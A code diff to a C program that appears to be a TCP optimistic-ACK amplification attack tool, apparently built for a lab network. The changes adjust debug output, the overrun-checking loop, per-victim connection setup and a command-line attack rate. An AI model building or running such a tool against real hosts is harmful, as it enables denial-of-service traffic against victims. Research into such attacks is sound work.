@@ -338,14 +338,14 @@ void handshake(struct victim_connection *m_victim,
 }
 void processOverruns(unsigned seq, struct victim_connection *m_victim)
 {
-  printf("Received packet in check overruns\n");
+  //printf("Received packet in check overruns\n");
   pthread_mutex_lock(&(m_victim->lock));
   if (seq == m_victim->last_received_seq) {
-    printf("This is an overrun\n");
+    //printf("This is an overrun\n");
     m_victim->had_overrun = 1;
     m_victim->overrun_ack = seq;
   } else if (seq > m_victim->last_received_seq) {
-    printf("There is no overrun\n");
+    //printf("There is no overrun\n");
     m_victim->last_received_seq = seq;
   }
   pthread_mutex_unlock(&(m_victim->lock));
@@ -364,8 +364,9 @@ void *checkOverruns(void *vargp) {
 
     while (current_time.tv_sec - start_time.tv_sec <= m_args->duration) {
 
-      for (i = 0; i < m_args->num_victims; i++) {
+      for (i = 0; i < m_args->num_victims && current_time.tv_sec - start_time.tv_sec <= m_args->duration; i++) {
 
+        printf("Waiting to receive packet from host %d\n", i);
         unsigned read_seq = read_packet(&(m_args->m_victims[i]),
                                           m_args->socket,
                                           m_args->m_victims,
@@ -373,9 +374,9 @@ void *checkOverruns(void *vargp) {
 
         processOverruns(read_seq, &(m_args->m_victims[i]));
 
-      }
+        gettimeofday(&current_time, NULL);
 
-      gettimeofday(&current_time, NULL);
+      }
 
     }
 }
@@ -396,22 +397,20 @@ int beginAttack(int duration, double target_rate, int num_victims) {
 
     // Set up each connection struct
     for(i = 0; i < num_victims; i++) {
-      struct victim_connection m_victim;
       char victAddr[20];
       sprintf(victAddr, "10.0.0.%d", i + 2);
 
-      m_victim.id = i + 2;
-      m_victim.dst_addr = inet_addr(victAddr);
-      m_victim.dst_port = 8080;//TODO;
-      m_victim.window = MSS;
-      m_victim.had_overrun = 0;
-      m_victim.overrun_ack = 0;
-      m_victim.is_done = 0;
-      if (pthread_mutex_init(&(m_victim.lock), NULL) != 0) {
+      m_victims[i].id = i + 2;
+      m_victims[i].dst_addr = inet_addr(victAddr);
+      m_victims[i].dst_port = 8080;//TODO;
+      m_victims[i].window = MSS;
+      m_victims[i].had_overrun = 0;
+      m_victims[i].overrun_ack = 0;
+      m_victims[i].is_done = 0;
+      if (pthread_mutex_init(&(m_victims[i].lock), NULL) != 0) {
         printf("\nFailed to create mutex lock");
         return 1;
       }
-      m_victims[i] = m_victim;
     }
 
     // TODO FOR MULTI CONNECTION DO THE NEXT 3 LINES TOGETHER FOR EACH
@@ -455,7 +454,7 @@ int beginAttack(int duration, double target_rate, int num_victims) {
         struct victim_connection *currConnection = &(m_victims[i]);
         pthread_mutex_lock(&(currConnection->lock));
         if (currConnection->had_overrun) {
-          printf("Resetting last sent ack\n");
+          //printf("Resetting last sent ack\n");
           currConnection->last_sent_ack = currConnection->overrun_ack;
           currConnection->had_overrun = 0;
         }
@@ -533,8 +532,10 @@ int beginAttack(int duration, double target_rate, int num_victims) {
                   0);                           // w_scale
 
     }
+    printf("Waiting to join\n");
     pthread_join(tid, NULL);
 
+    printf("Joined with other thread\n");
     for (i = 0; i < num_victims; i++ ) {
       pthread_mutex_destroy(&(m_victims[i].lock));
     }
@@ -549,8 +550,8 @@ int main(int argc, char const *argv[]) {
   // TODO, more arguments will be provided as the ip and ports of victims
 
   int num_victims = atoi(argv[1]);
-
-  beginAttack(30, 11250000.0, num_victims);
+  int target_rate = atoi(argv[2]);
+  beginAttack(30, target_rate, num_victims);
 
   return 0;
 }
